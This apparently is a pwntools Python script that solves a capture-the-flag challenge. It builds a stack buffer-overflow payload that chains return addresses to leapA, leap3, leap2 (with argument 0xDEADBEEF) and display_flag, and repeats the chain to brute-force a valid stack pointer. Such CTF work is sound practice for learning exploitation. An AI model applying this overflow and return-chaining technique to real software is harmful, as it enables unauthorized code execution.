from pwn import *

"""
First, jump to leapA at 0x80485e6 to set win1

Then, jump to the middle of leap3 at 0x8048690 to set win3

ISSUE with esp and ebp after this: mov esp, ebp requires that ebp be a valid stack address
For now, just try to brute force this

Next, jump to leap2 with argument 0xDEADBEEF at 0x80485fd

Finally, jump to display_flag at 0x80486b3 to win!
"""

exploit = 'a'*24

# ebp pointing into stack, attempting brute force strategy
exploit += p32(0xffbed064)

# leapA()
exploit += p32(0x80485e6)

# leap3() with leave handling
exploit += p32(0x8048690)
exploit += "febp"

# Repeat this for the best chance of getting valid esp
for i in range(50):
    # leap2() with argument 0xDEADBEEF
    exploit += p32(0x80485fd)
    # return to display_flag()
    exploit += p32(0x80486b3)
    exploit += p32(0xDEADBEEF)
    # padding to fit 16 bytes
    exploit += "padd"

print(exploit)
